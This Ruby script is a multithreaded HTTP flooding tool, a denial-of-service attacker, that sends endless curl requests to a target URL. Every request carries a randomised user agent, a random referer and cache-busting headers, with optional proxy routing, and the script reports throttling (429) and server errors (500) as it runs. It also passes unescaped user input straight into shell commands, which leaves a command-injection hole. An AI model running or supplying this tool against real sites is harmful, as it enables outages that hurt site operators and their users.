require 'optparse'
require 'thread'
require 'open3'

def banner
  "

╔╗ ┌─┐┌┐┌┌─┐╔╗ ┬─┐┌─┐┌─┐
╠╩╗├─┤││││ ┬╠╩╗├┬┘│ │└─┐
╚═╝┴ ┴┘└┘└─┘╚═╝┴└─└─┘└─┘
   Instagram : @0zctn v#{version}                                             
  "
end

def version
  '1.0.0'
end

def colorize text, color_code
  "\e[#{color_code}m#{text}\e[0m"
end

def green text
  colorize text, 32
end

def red text
  colorize text, 31
end

def user_agent
  fixed_curl_minor = curl_minor
  fixed_curl_revision = curl_revision
  "curl/7.#{fixed_curl_minor}.#{fixed_curl_revision} (x86_64-pc-linux-gnu) libcurl/7.#{fixed_curl_minor}.#{fixed_curl_revision} OpenSSL/0.9.8#{openssl_revision} zlib/1.2.#{zlib_revision}"
end

def curl_minor
  random.rand(8..22)
end

def curl_revision
  random.rand(1..9)
end

def openssl_revision
  ('a'..'z').to_a[random.rand(0..25)]
end

def zlib_revision
  random.rand(2..6)
end

def random_string
  (1...random.rand(5..10)).map { ('A'..'Z').to_a[rand(26)] }.join
end

def random
  Random.new
end

def rotation_chars
  ['/', '-', '\\', '|']
end

def start_loading_progress
  Thread.new do
    counter = [0]
    loop do
      counter[0] += 1
      print "\r#{rotation_chars[counter[0] % rotation_chars.length]}\r"
      sleep 0.2
    end
  end
end

def start_notifying
  @requests_counter = 0
  Thread.new do
    loop do
      sleep 3.5
      puts "[#{green('i')}] #{@requests_counter} Requests Send\n"
    end
  end
end

def input_options
  @input_options ||= parse_flags
end

def parse_flags
  options = {}
  OptionParser.new do |opt|
    opt.on('--url       Target Url (e.g. "https://target.site.com")') { |o| options[:url] = o }
    opt.on('--threads   Number Of Scanning Threads (Default 20)') { |o| options[:threads] = o }
    opt.on('--type      Type Of Request (e.g. "get") (Default "get")') { |o| options[:type] = o }
    opt.on('--proxy     Proxy Address (e.g. "http://proxy-site.com:1345")') { |o| options[:proxy] = o }
    opt.on('--data      Data Payload For POST Request (e.g. "{"json": "payload"}")') { |o| options[:data] = o }
    opt.on('--ah        Specify Additional Header (e.g. "Content-Type: application/json")') { |o| options[:ah] = o }
  end.parse!
  return options
rescue
  puts "[!] Use '-h' To See Available Options\n"
  abort
end

def data
  input_options[:data]
end

def type
  (input_options[:type] || 'get').upcase
end

def url
  input_options[:url]
end

def proxy
  input_options[:proxy]
end

def threads
  (input_options[:threads] || 20).to_i
end

def init_headers
  @headers = [
	  'Cache-Control: no-cache',
		'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7',
		"Referer: http://www.google.com/?q=#{random_string}",
		"Keep-Alive: #{random.rand(110..120)}",
		'Connection: keep-alive'
  ]
  @headers << (input_options[:ah]) if input_options[:ah]
  @headers.map! { |h| "-H \"#{h}\"" }
end

def requests_parallel_run
  running_threads = []
  threads.times do
    running_threads << Thread.new do
      while true
        make_request(url, proxy)
      end
    end
  end

  running_threads.each {|t| t.join }
end

def make_request(url, proxy = nil, headers = { 'User-agent' => user_agent })
  begin
    stdin, stdout, stderr, wait_thr1 = Open3.popen3(curl_request(url, proxy))
    retval = stdout.read
    status_code = retval.to_i
    puts "[#{red('!')}] You Have Been Throttled(429)" if status_code == 429
    puts "[#{red('!')}] Status Code 500 Received" if status_code == 500
    @requests_counter += 1 unless status_code == 0
  rescue => error
    retval = error
  end
  retval
end

def curl_requests
  {
    [true, true] => "curl --write-out %{http_code} -o /dev/null #{@headers.join(' ')} -X #{type} -A \"#{user_agent}\" #{url}",
    [true, false] => "curl --write-out %{http_code} -o /dev/null #{@headers.join(' ')} -X #{type} -d \"#{data}\" -A \"#{user_agent}\" #{url}",
    [false, true] => "curl --write-out %{http_code} -o /dev/null #{@headers.join(' ')} -X #{type} -A \"#{user_agent}\" --proxy #{proxy} #{url}",
    [false, false] => "curl --write-out %{http_code} -o /dev/null #{@headers.join(' ')} -X #{type} -d \"#{data}\" -A \"#{user_agent}\" --proxy #{proxy} #{url}"
  }
end

def curl_request(url, proxy = nil)
  curl_requests_list = curl_requests
  curl_requests_list[[proxy.nil?, data.nil?]]
end

def run
  puts "#{banner}\n\n"
  input_options
  init_headers
  start_loading_progress
  start_notifying
  puts "[i] Start Sending Requests (#{threads} threads)...\n"
  requests_parallel_run
end

trap('SIGINT') { puts "\n\r[!] Ctrl+C Pressed\r"; exit }

run                        
